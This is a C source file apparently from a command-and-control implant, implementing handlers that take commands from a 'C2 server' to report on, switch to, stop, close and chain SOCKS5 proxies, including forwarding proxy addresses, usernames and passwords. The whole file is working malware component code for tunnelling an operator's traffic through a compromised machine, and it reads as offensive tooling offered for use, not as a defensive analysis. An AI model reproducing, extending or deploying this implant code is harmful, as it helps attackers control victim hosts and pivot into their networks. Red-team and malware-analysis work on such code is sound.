#include <string.h>
#include "cJSON.h"
#include "agent_session.h"
#include "agent_protocol.h"
#include "agent_utility.h"
#include "agent_config.h"
#include "agent_commands.h"
#include "agent_network.h"
#include "agent_proxy.h"
#include "agent_named_pipe.h"

command_result* cmd_proxy_info(session* sess, packet* pck)
{
	message* msg = ZERO(message);
	cJSON* jpck = ZERO(cJSON);
	cJSON* jport = ZERO(cJSON);
	cJSON* jresponse = ZERO(cJSON);
	char* response_string = ZERO(char);
	socks5_command cmd = { .type = INFO };
	DECLARE_RESULT(error);

	jpck = convert_to_JSON(pck);
	if (!jpck) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}

	// extract proxy info
	jport = cJSON_GetObjectItem(jpck, "port");
	if (!jport) {
		error->error_code = ERROR_MISSING_DATA;
		error->data = (void*)"port";
		goto fail;
	}

	if (!proxy_send_command(&cmd, jport->valuestring)) goto fail;

	// the received data is in JSON format
	jresponse = cJSON_Parse(cmd.response);
	if (!jresponse) goto fail;

	// add type
	cJSON* jtype = cJSON_CreateString("socks5");
	if (!jtype) goto fail;
	cJSON_AddItemToObject(jresponse, "type", jtype);

	// create string result		
	response_string = cJSON_Print(jresponse);
	if (!response_string) goto fail;

	// send it to the C2 server	
	msg = message_create(sess);
	if (!msg) goto fail;
	if (!message_add_request_data(
		msg,
		strlen(response_string),
		response_string,
		pck->id,
		0,
		REQUEST_COMMANDDATA,
		PACKET_STATE_NO_MORE_PACKETS,
		false
	)) goto fail;
	if (!message_send(sess, msg)) goto fail;

	SET_RESULT_SUCCESS(error);

fail:
	if (jpck) cJSON_Delete(jpck);
	if (jresponse) cJSON_Delete(jresponse);
	FREE(msg);
	FREE(cmd.response);
	FREE(response_string);
	return error;
}

command_result* cmd_proxy_use(session* sess, packet* pck)
{
	DECLARE_RESULT(error);
	cJSON* jpck = convert_to_JSON(pck);
	proxy* p = ZERO(proxy);
	if (!jpck) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}	

	// add the new proxy to the config	
	cJSON_ReplaceItemInObject(sess->active_server, CONFIG_SERVER_PROXY, jpck);

	// refresh the session to set the proxy
	session_refresh(sess);
		
	SET_RESULT_SUCCESS(error);

exit:
	return error;

fail:
	if (jpck) cJSON_Delete(jpck);
	goto exit;
}

command_result* cmd_proxy_close(session* sess, packet* pck)
{
	DECLARE_RESULT(error);
	SET_RESULT_SUCCESS(error);	
	sess->proxy = ZERO(proxy);	
	cJSON_ReplaceItemInObject(sess->active_server, CONFIG_SERVER_PROXY, cJSON_CreateObject());
	return error;
}

command_result* cmd_proxy_stop(session* sess, packet* pck)
{
	// first stop using the proxy
	DECLARE_RESULT(error);
	socks5_command cmd = { .type = STOP };
	
	// obtain proxy details
	cJSON* jpck = convert_to_JSON(pck);	
	if (!jpck) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	
	// extract proxy info
	cJSON* jport = cJSON_GetObjectItem(jpck, "port");
	if (!jport) {
		error->error_code = ERROR_MISSING_DATA;
		error->data = (void*)"port";
		goto fail;
	}

	if (!proxy_send_command(&cmd, jport->valuestring)) goto fail;
	SET_RESULT_SUCCESS(error);
	
exit:	
	return error;
fail:
	goto exit;
}

command_result* cmd_proxy_chain_stop(session* sess, packet* pck)
{
	// first stop using the proxy
	DECLARE_RESULT(error);
	socks5_command cmd = { .type = CHAIN_STOP };

	// obtain proxy details
	cJSON* jpck = convert_to_JSON(pck);
	if (!jpck) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}

	// extract proxy info
	cJSON* jport = cJSON_GetObjectItem(jpck, "port");
	if (!jport) {
		error->error_code = ERROR_MISSING_DATA;
		error->data = (void*)"port";
		goto fail;
	}

	if (!proxy_send_command(&cmd, jport->valuestring)) goto fail;
	SET_RESULT_SUCCESS(error);

exit:
	return error;
fail:
	goto exit;
}

command_result* cmd_proxy_chain_create(session* sess, packet* pck)
{
	DECLARE_RESULT(error);
	socks5_command* cmd = ZERO(socks5_command);
	uint8_t* buffer = ZERO(uint8_t);

	// obtain proxy details
	cJSON* jpck = convert_to_JSON(pck);
	if (!jpck) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}

	// extract proxy info
	cJSON* jport = cJSON_GetObjectItem(jpck, "port");
	if (!jport) {
		error->error_code = ERROR_MISSING_DATA;
		error->data = (void*)"port";
		goto fail;
	}

	cJSON* jproxyAddress = cJSON_GetObjectItem(jpck, "proxyAddress");
	if (!jproxyAddress) {
		error->error_code = ERROR_MISSING_DATA;
		error->data = (void*)"proxyAddress";
		goto fail;
	}

	cJSON* jproxyPort = cJSON_GetObjectItem(jpck, "proxyPort");
	if (!jproxyPort) {
		error->error_code = ERROR_MISSING_DATA;
		error->data = (void*)"proxyPort";
		goto fail;
	}

	cJSON* jproxyUsername = cJSON_GetObjectItem(jpck, "proxyUsername");
	if (!jproxyUsername) {
		error->error_code = ERROR_MISSING_DATA;
		error->data = (void*)"proxyUsername";
		goto fail;
	}

	cJSON* jproxyPassword = cJSON_GetObjectItem(jpck, "proxyPassword");
	if (!jproxyPassword) {
		error->error_code = ERROR_MISSING_DATA;
		error->data = (void*)"proxyPassword";
		goto fail;
	}
	
	size_t buffer_size =
		strlen(jproxyAddress->valuestring)	+ 1 +
		strlen(jproxyPort->valuestring)		+ 1 +
		strlen(jproxyUsername->valuestring) + 1 +
		strlen(jproxyPassword->valuestring) + 1;
	
	cmd = MEM_ALLOC(sizeof(socks5_command) + buffer_size);
	if (!cmd) goto fail;

	cmd->type = CHAIN_CREATE;
	cmd->data_size = buffer_size;
	size_t offset = 0;

	memcpy(cmd->data, jproxyAddress->valuestring, strlen(jproxyAddress->valuestring));
	offset += strlen(jproxyAddress->valuestring) + 1;
	
	memcpy(cmd->data + offset, jproxyPort->valuestring, strlen(jproxyPort->valuestring));
	offset += strlen(jproxyPort->valuestring) + 1;

	memcpy(cmd->data + offset, jproxyUsername->valuestring, strlen(jproxyUsername->valuestring));
	offset += strlen(jproxyUsername->valuestring) + 1;

	memcpy(cmd->data + offset, jproxyPassword->valuestring, strlen(jproxyPassword->valuestring));
	
	if (!proxy_send_command(cmd, jport->valuestring)) goto fail;	
	SET_RESULT_SUCCESS(error);
exit:
	FREE(cmd);
	if (jpck) cJSON_Delete(jpck);
	return error;
fail:
	goto exit;
}